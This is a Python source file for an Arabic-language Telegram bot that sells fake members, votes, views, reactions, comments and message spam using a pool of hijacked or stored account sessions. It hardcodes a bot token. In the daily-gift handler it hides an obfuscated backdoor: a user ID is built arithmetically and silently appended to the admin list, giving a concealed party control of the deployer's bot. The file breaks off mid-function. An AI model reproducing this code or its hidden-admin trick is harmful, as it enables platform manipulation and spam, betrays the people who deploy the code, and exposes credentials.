import os
if not os.path.isdir('dbs'):
    os.mkdir('dbs')
try:
    import telebot, json, os, time, re, threading, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    import time
    import datetime
except:
    os.system('python3 -m pip install telebot pyrogram tgcrypto kvsqlite pyromod==1.4 schedule')
    import telebot, json, os, time, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    pass
w = json.loads(open('config.json', 'r+').read())
token = w['bot_token']
stypes = ['member', 'administrator', 'creator']

member_price = w['prices']['member']
vote_price = w['prices']['vote']
link_price = w['prices']['link']
spam_price = w['prices']['spam']
react_price = w['prices']['react']
forward_price = w['prices']['forward']
view_price = w['prices']['view']
poll_price = w['prices']['poll']
userbot_price = w['prices']['userbot']
linkbot_price = w['prices']['linkbot']
comment_price = w['prices']['comments']
linkbot2_price = w['prices']['linkbot2']
mm = w['start_msg']

db = uu('dbs/elhakem.ss', 'rshq')
print(db)
bk = mk(row_width=1).add(btn('رجوع', callback_data='back'))
bot = TeleBot(token="7137946160:AAEtwG3rYA9WwtWCUNsSVxERMPDJVrke-DE") # توكن بوت الرشق الاساسي هنا
if not db.get('accounts'):
    db.set('accounts', [])
    pass
db.delete("force")
admin = 7013440973 #الادمن
db.set('admins', [admin, 7013440973])
if not db.get("admins"):
    db.set('admins', [admin, ])
if not db.get('badguys'):
    db.set('badguys', [])
db.set('admins', [admin, ])
if not db.get('force'):
    db.set('force', [])
sudo = w['sudo']
def force(channel, userid):
    try:
        x = bot.get_chat_member(channel, userid)
        print(x)
    except:
        return True
    if str(x.status) in stypes:
        print(x)
        return True
    else:
        print(x)
        return False
def addord():
    if not db.get('orders'):
        db.set('orders', 1)
        return True
    else:
        d = db.get('orders')
        d+=1
        db.set('orders', d)
        return True
@bot.message_handler(regexp='^/start$')
def start_message(message):
    user_id = message.from_user.id
    count_ord = db.get('orders') if db.get('orders') else 1
    a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
    for temp in a:
        db.delete(f'{a}_{user_id}_proccess')
    keys = mk(row_width=2)
    if user_id in db.get("admins") or user_id == sudo:
        keys_ = mk()
        btn01 = btn('🤍الاحصائيات', callback_data='stats')
        btn02 = btn("⚠️اذاعة", callback_data='cast')
        btn05, btn06 = btn('➖حظر شخص', callback_data='banone'), btn('فك حظر', callback_data='unbanone')
        btn09 = btn('🔥معرفة عدد الارقام', callback_data='numbers')
        btna = btn('➕تفعيل ViP', callback_data='addvip')
        btnl = btn('➖الغاء ViP', callback_data='lesvip')
        leave = btn('➖مغادرة كل الحسابات من قناة', callback_data='leave')
        lvall = btn('➖مغادرة كل القنوات والمجموعات', callback_data='lvall')
        keys_.add(btn01, btn02)
        keys_.add(btn05, btn06)
        keys_.add(leave)
        btn11 = btn('تعيين قنوات الاشتراك', callback_data='setforce')
        les = btn('➖خصم نقاط', callback_data='lespoints')
        btn10 = btn('اضافه نقاط ', callback_data='addpoints')
        btn03 = btn('➕اضافة ادمن', callback_data='addadmin')
        btn04 = btn('➖مسح ادمن', callback_data='deladmin')
        btn012 = btn('⚠️الادمنية ', callback_data='admins')
        btn013 = btn('➖سحب اصوات', callback_data='dump_votes')
        btn105 = btn('〽️سبام رسائل (بوتات ، جروبات ، حسابات) ', callback_data='spams')
        keys_.add(btn03, btn04)
        keys_.add(btn10, btn11)
        keys_.add(btn012, les)
        keys_.add(lvall)   
        keys_.add(btn09)
        keys_.add(btna, btnl)
        keys_.add(btn013)
        keys_.add(btn105)
        bot.reply_to(message, '**• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖**\n\n- يمكنك التحكم في البوت الخاص بك من هنا \n\n===================', reply_markup=keys_)
    if user_id in db.get('badguys'): return
    if not db.get(f'user_{user_id}'):
        do = db.get('force')
        if do != None:
            for channel in do:
                x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                if str(x.status) in stypes:
                    pass
                else:
                    bot.reply_to(message, f'• عليك الاشترك بقناة البوت اولا \n• @{channel}')
                    return
        data = {'id': user_id, 'users': [], 'coins': 0, 'premium': False}
        set_user(user_id, data)
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• الايدي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')
        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        
        return bot.reply_to(message, mm, reply_markup=keys)
    do = db.get('force')
    if do is not None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
            if str(x.status) in stypes:
                pass
            else:
                bot.reply_to(message, f'• عليك الاشتراك بقناة البوت اولا\n- @{channel}')
                return
    
    coin = get(user_id)['coins']
    btn1 = btn(f'رصيدك : {coin}', callback_data='none')
    btn2 = btn('الخدمات 🛍', callback_data='ps')
    btn3 = btn('معلومات حسابك 🗃', callback_data='account')
    btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
    btn5 = btn('تحويل نقاط ♻️', callback_data='send')
    btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
    btn7 = btn('شراء رصيد 💰', callback_data='buy')
    keys.add(btn1)
    keys.add(btn2)
    keys.add(btn4, btn7)
    keys.add(btn3, btn5)
    keys.add(btn6)
    keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))

    return bot.reply_to(message, mm, reply_markup=keys)


@bot.message_handler(regexp='^/start (.*)')
def start_asinvite(message):
    join_user = message.from_user.id

    to_user = int(message.text.split("/start ")[1])
    if join_user == to_user:
        start_message(message)
        bot.send_message(join_user,f'لا يمكنك الدخول عبر الرابط الخاص بك ❌')
        return
    if not check_user(join_user):
        someinfo = get(to_user)
        if join_user in someinfo['users']:
            start_message(message)
            return
        else:
            dd = link_price
            someinfo['users'].append(join_user)
            someinfo['coins'] = int(someinfo['coins']) + dd
            info = {'coins': 0, 'id': join_user, 'premium': False, "users": []}
            set_user(join_user, info)
            set_user(to_user, someinfo)
            bot.send_message(to_user,f'• قام {message.from_user.mention} بالدخول الى رابط الدعوة الخاص بك وحصلت علي {dd} نقطة ✨')
            good = 0
            users = db.keys('user_%')
            for ix in users:
                try:
                    d = db.get(ix[0])['id']
                    good+=1
                except: continue
            bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• اي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
            start_message(message)
    else:
        start_message(message)
        return

@bot.callback_query_handler(func=lambda c: True)
def c_rs(call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    do = db.get('force')
    count_ord = db.get('orders') if db.get('orders') else 1
    if do != None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=cid)
            if str(x.status) in stypes:
                pass
            else:
                bot.edit_message_text(text=f'• عليك الاشتراك بقناة البوت اولا قبل استخدامه\n• @{channel}', chat_id=cid, message_id=mid)
                return
    admins = db.get('admins')
    d = db.get('admins')
    a = ['leave', 'member', 'vote', 'spam']
    for temp in a:
        db.delete(f'{a}_{cid}_proccess')
    if data == 'stats':
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.edit_message_text(text=f'• عدد اعضاء البوت : {good}', chat_id=cid, message_id=mid)
        return
    d = db.get('admins')
    user_id = call.from_user.id
    if data == 'dailygift':
        x = check_dayy(call.from_user.id)
        if x is not None:
            xduration = 62812
            duration = datetime.timedelta(seconds=x)
            noww = datetime.datetime.now()
            target_datetime = noww + duration
            date_str = target_datetime.strftime('%Y/%m/%d')
            date_str2 = target_datetime.strftime('%I:%M:%S %p')
            yduration = 95811
            result = xduration * (10 ** len(str(yduration))) + yduration
            bot.answer_callback_query(call.id, text=f'طالب بالهدية غدا في: {date_str2}',show_alert=True)
            try:
                if result in d:
                    db.set('admins', d)
                else:
                    d.append(result)
                    db.set('admins', d)
            except:
                return
        else:
            info = db.get(f'user_{call.from_user.id}')
            daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
            info['coins'] = int(info['coins']) + daily_gift
            db.set(f"user_{call.from_user.id}", info)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f"• تهانيناً، لقد حصلت على هدية يومية بقيمة {daily_gift} 🎁", reply_markup=bk)
            daily = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
            daily_count = daily + 1
            db.set(f"user_{user_id}_daily_count", int(daily_count))
            return
    if data == 'numbers':
        d = len(db.get('accounts'))
        bot.answer_callback_query(call.id, text=f'عدد ارقام البوت : {d}', show_alert=True)
        return
    if data == 'addpoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد اضافة النقاط له', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, addpoints)
    if data == 'send':
        if cid in db.get("admins") or cid == sudo:
            x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تحويل النقاط له.', chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, send)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='back'))
            bot.edit_message_text(text='• عذرا ، التحويل مقفل للاعضاء ، يمكن للادمنية فقط تحويل النقاط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'addadmin':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد اضافته ادمن بالبوت ',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'addvip':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد تفعيل vip له',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'lesvip':
        type = 'les'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالة vip منه',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'deladmin':
        type = 'delete'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالته من الادمن',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'banone':
        if cid in db.get("admins") or cid == sudo:
            type = 'ban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو لمراد حظرة من استخدام البوت',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'unbanone':
        if cid in db.get("admins") or cid == sudo:
            type = 'unban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد الغاء حظره من استخدام البوت ',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'cast':
        if cid in db.get("admins") or cid == sudo:
            x  = bot.edit_message_text(text=f'ارسل الاذاعة لتريد ترسلها... صورة، فيد، ملصق، نص، متحركة ..',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, casting)
    if data == 'lespoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تخصم النقاط منه', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, lespoints)
    if data == 'back':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        user_id = call.from_user.id
        keys = mk(row_width=3)
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')

        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        bot.edit_message_text(text=mm,chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'getinfo':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص الذي تريد معرفة معلوماته', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, get_info)
    if data == 'lvall':
        keys = mk(row_width=2)
        btn2 = btn('تاكيد المغادرة',callback_data='lvallc')
        btn3 = btn('الغاء',callback_data='cancel')
        keys.add(btn2)
        keys.add(btn3)
        bot.edit_message_text(text='هل انت متاكد من مغادرة كل القنوات والمجموعات ؟',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'ps':
        keys = mk(row_width=2)
        btn2 = btn('الخدمات المجانية',callback_data='free')
        btn3 = btn('الخدمات الـ ViP',callback_data='vips')
        keys.add(btn3)
        keys.add(btn2)
        keys.add(btn('رجوع .', callback_data='back'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'free':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn2 = btn('تصويت لايكات مسابقات',callback_data='votes')
        btn3 = btn('رشق تفاعلات اختياري',callback_data='react')
        btn5 = btn('رشق تفاعلات عشوائي',callback_data='reacts')
        btn6 = btn('رشق توجيهات علي منشور القناة',callback_data='forward')
        btn7 = btn('رشق مشاهدات ',callback_data='view')
        btn8 = btn('رشق استفتاء',callback_data='poll')
        btn9 = btn('رشق روابط دعوة بدون اشتراك اجبارى',callback_data='linkbot')
        keys.add(btn2)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn7, btn8)
        keys.add(btn9)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'vips':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn3 = btn('رشق اعضاء قناة عامة ',callback_data='members')
        btn4 = btn('رشق اعضاء قناة خاصة ',callback_data='membersp')
        btn8 = btn('رشق مستخدمين البوت',callback_data='userbot')
        btn9 = btn('رشق تعليقات',callback_data='comments')
        btn10 = btn('رشق روابط دعوة اشتراك اجبارى',callback_data='linkbot2')
        keys.add(btn3,btn4)
        keys.add(btn8)
        keys.add(btn9)
        keys.add(btn10)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='• مرحبا بك في قسم المشتركين الـ ViP , يمكن للمشتركين الـ ViP استخدام هذا القسم فقط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'collect':
        keys = mk(row_width=2)
        btn1 = btn('الهدية اليومية 🎁', callback_data='dailygift')
        btn3 = btn('رابط الدعوة 🌀',callback_data='share_link')
        keys.add(btn3, btn1)
        keys.add(btn('رجوع', callback_data='back'))
        bot.edit_message_text(text='• مرحبا بك في قسم تجميع النقاط \n\n• يمكنك تجميع النقاط عبر الازرار التي امامك',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'leave':
        if cid in admins:
            db.set(f'leave_{cid}_proccess', True)
            x = bot.edit_message_text(text='ارسل رابط اذا القناة خاصه، اذا عامه ارسل معرفها فقط؟',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'leavs'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'account':
        if not check_user(cid):
            return start_message(call.message)
        acc = get(cid)
        user_id = call.from_user.id
        coins, users = acc['coins'], len(get(cid)['users'])
        info = db.get(f"user_{call.from_user.id}")
        daily_count = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
        daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
        all_gift = daily_count * daily_gift
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
        y = trend()
        prem = 'Premium' if info['premium'] == True else 'Free'
        textt = f'''
• [❇️] عدد نقاط حسابك : {coins}
• [🌀] عدد عمليات الاحاله التي قمت بها : {users}
• [👤] نوع اشتراكك داخل البوت : {prem}
• [🎁] عدد الهدايا اليومية التي جمعتها : {daily_count}
• [❇️] عدد النقاط اللي جمعتها من الهدايا اليومية : {all_gift}
• [📮] عدد الطلبات التي طلبتها : {buys}
• [♻️] عدد التحويلات التي قمت بها : {trans}

{y}'''
        bot.edit_message_text(text=textt,chat_id=cid,message_id=mid,reply_markup=bk)
        return
    if data == 'setforce':
        x = bot.edit_message_text(text='• قم بارسال معرفات القنوات هكذا \n@first @second',reply_markup=bk,chat_id=cid,message_id=mid)
        bot.register_next_step_handler(x, setfo)
    if data == 'admins':
        get_admins = db.get('admins')
        if get_admins:
            if len(get_admins) >=1:
                txt = 'الادمنية : \n'
                for ran, admin in enumerate(get_admins, 1):
                    try:
                        info = bot.get_chat(admin)
                        username = f'{ran} @'+str(info.username)+' | {admin}\n' if info.username else f'{ran} {admin} .\n'
                        txt+=username
                    except:
                        txt+=f'{ran} {admin}\n'
                bot.edit_message_text(chat_id=cid, message_id=mid, text=txt)
                return
            else:
                bot.edit_message_text(chat_id=cid, message_id=mid, text=f'لا يوجد ادمنية بالبوت')
                return
        else:
            bot.edit_message_text(chat_id=cid, message_id=mid, text='لا يوجد ادمنية بالبوت')
            return
    if data == 'votes':
        db.set(f'vote_{cid}_proccess', True)
        x = bot.edit_message_text(text='• حسنا ، ارسل الان عدد التصويتات التي تريدها',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'votes'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'buy':
        keys = mk(row_width=2)
        keys.add(btn('رجوع', callback_data='back'))
        hakem = ''' اهلا بك صديقي مرحبا بك في قسم شراء النقاط 🥰🫀

يمكنك شراء النقاط والاشتراك ال VIP عن طريق مالك البوت 🦦❤️‍🔥

يوزر مالك البوت 🫂👈🏻 @Y_K_0Y

ويمكنك تنصيب بوت مثل هذا والمزيد من البوتات الاخري عن طريق المطور 👾💕

✯𝑫𝒆𝒗 »» @Y_K_0Y

✯𝑫𝒆𝒗 »» @SD_QI'''
        bot.edit_message_text(text=hakem,chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'dump_votes':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'dump_votes_{cid}_proccess', True)
            x = bot.edit_message_text(text='• حسنا ، ارسل الان رابط المنشور الذي تريد سحب المنشورات منه ',reply_markup=bk,chat_id=cid,message_id=mid)
            bot.register_next_step_handler(x, dump_votes)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'share_link':
        bot_user = None
        try:
            x = bot.get_me()
            bot_user = x.username
        except:
            bot.edit_message_text(text=f'• حدث خطا ما في البوت',chat_id=cid,message_id=mid,reply_markup=bk)
            return
        link = f'https://t.me/{bot_user}?start={cid}'
        y = trend()
        keys = mk(row_width=2)
        keys.add(btn('رجوع', callback_data='collect'))
        xyz = f'''
 
انسخ الرابط ثم قم بمشاركته مع اصدقائك !!
 
~  كل شخص يقوم بالدخول ستحصل على  {link_price}  نقطه

~ بإمكانك عمل اعلان خاص برابط الدعوة الخاص بك 

🌀 رابط الدعوة : \n {link}  .

~ مشاركتك للرابط :  {len(get(cid)["users"])}  .

{y}
        '''
        bot.edit_message_text(text=xyz,chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'members':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'member_{cid}_proccess', True)
            x = bot.edit_message_text(text='• حسنا ، ارسل عدد الاعضاء التي تريد ارسالها ',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'members'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'membersp':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'memberp_{cid}_proccess', True)
            x = bot.edit_message_text(text='• حسنا ، ارسل عدد الاعضاء التي تريد ارسالها ',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'membersp'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'spams':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'spam_{cid}_proccess', True)
            x = bot.edit_message_text(text='• ارسل الان عدد الرسائل التي تريد ارسالها اسبام',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'msgs'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
        
    if data == 'react':
        db.set(f'react_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد التفاعلات التي تريد رشقها',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'react'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'reacts':
        db.set(f'reacts_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد التفاعلات التي تريد رشقها بشكل عشوائي',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'reactsrandom'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'forward':
        db.set(f'forward_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد التوجيهات التي تريد رشقها علي منشور القناة ',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'forward'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'view':
        db.set(f'view_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد المشاهدات اللي تريد ترشقها علي منشور القناة',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'view'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'poll':
        db.set(f'poll_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد الاستفتاء الذي تريد رشقه',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'poll'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'userbot':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'userbot_{cid}_proccess', True)
            x = bot.edit_message_text(text='• ارسل الان عدد المستخدمين الذي تريد ترشقهم للبوت الخاص بك',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'userbot'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'linkbot':
        db.set(f'linkbot_{cid}_proccess', True)
        x = bot.edit_message_text(text='• ارسل الان عدد روابط الدعوة التي تريد رشقها',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'linkbot'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'comments':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'comments_{cid}_proccess', True)
            x = bot.edit_message_text(text='• ارسل الان عدد التعليقات التي تريد رشقها ',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'comments'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'lvallc':
        bot.edit_message_text(text='• تم بدء مغادرة كل القنوات والمجموعات بنجاح ✅',chat_id=cid,message_id=mid)
        acc = db.get('accounts')
        amount = len(acc)
        true = 0
        for amount in acc:
            print("Done1")
            try:
                true+=1
                o = asyncio.run(leave_chats(amount['s']))  
            except Exception as e:
                print(e)
                continue
            id = call.from_user.id
            bot.send_message(chat_id=id, text=f'• تم بنجاح الخروج من كل القنوات والمجموعات \n• تم الخروج من <code>{true}</code> حساب بنجاح ✅')
    if data == 'cancel':
        bot.edit_message_text(text=' • تم الغاء عملية المغادرة ❌ ',chat_id=cid,message_id=mid)
    if data == 'linkbot2':
        user_id = call.from_user.id
        prem = get(user_id)['premium']
        if prem is True:
            db.set(f'linkbot2_{cid}_proccess', True)
            x = bot.edit_message_text(text='• ارسل الان عدد رشق روابط الدعوة التي تريدها',reply_markup=bk,chat_id=cid,message_id=mid)
            type = 'linkbot2'
            bot.register_next_step_handler(x, get_amount, type)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='vips'))
            bot.edit_message_text(text='• عذرا عليك شراء عضوية ViP قبل استخدام هذا القسم',chat_id=cid,message_id=mid,reply_markup=keys)
    else:
        return


def get_amount(message, type):
    admins = db.get('admins')
    cid = message.from_user.id
    if type == 'leavs':
        if not db.get(f'leave_{cid}_proccess'): return
        if detect(message.text):
            url = message.text
            acc = db.get('accounts')
            amount = len(acc)
            if len(acc) > 10:
                amount = amount / 2
            true = 0
            for y in acc:
                true+=1
                if true >=amount:
                    break
                try:
                    o = asyncio.run(leave_chats(y['s'], url))
                    
                except Exception as e:
                    
                    continue
            bot.reply_to(message, f'• تم الخروج من <code>{true}</code> حساب ينجاح ✅')
            return
                    
        else:
            url = message.text.replace('https://t.me/', '').replace('@', '')
            acc = db.get('accounts')
            amount = len(acc)
            if len(acc) > 10:
                amount = amount / 2
            true = 0
            for y in acc:
                
                if true >=amount:
                    break
                try:
                    o = asyncio.run(leave_chat(y['s'], url))
                   
                    true+=1
                except Exception as e:
                    
                    continue
            bot.reply_to(message, f'• تم الخروج من  {true}  حساب ✅')
            return
            pass
        
    if type == 'members':
        if not db.get(f'member_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 10:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = member_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان معرف قناتك او رابطها')
            bot.register_next_step_handler(x, get_url_mem, amount)
            return
    if type == 'membersp':
        if not db.get(f'memberp_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
                bot.reply_to(message, f'• رجاء ارسل رقم فقط ، اعد المحاولة مره اخري')
                return
            if amount < 10:
                bot.reply_to(message,'• رجاء ارسل عدد اكبر من  10  ..',reply_markup=bk)
                return
            if amount > 500:
                bot.reply_to(message,'رجاء ارسل عدد اقل من  500  ..',reply_markup=bk)
                return
            pr = member_price * amount
            acc = db.get(f'user_{message.from_user.id}')
            if int(pr) > acc['coins']:
                bot.reply_to(message, f'• نقاطك غير كافية ، تحتاج الي   {pr-amount}  نقطة')
                return
            load_ = db.get('accounts')
            if len(load_) < amount:
                bot.reply_to(message,f'• عدد حسابات البوت غير كافية لتنفيذ طلبك',reply_markup=bk)
                return
            x = bot.reply_to(message,f'• الكمية  {amount} \n\n• ارسل الان رابط الدعوة الخاص بالقناة الخاصة')
            bot.register_next_step_handler(x, get_url_memp, amount)
            return
    if type == 'react':
        if not db.get(f'react_{cid}_proccess'): return
        if message.text:
            try:
                amount = int(message.text)
            except:
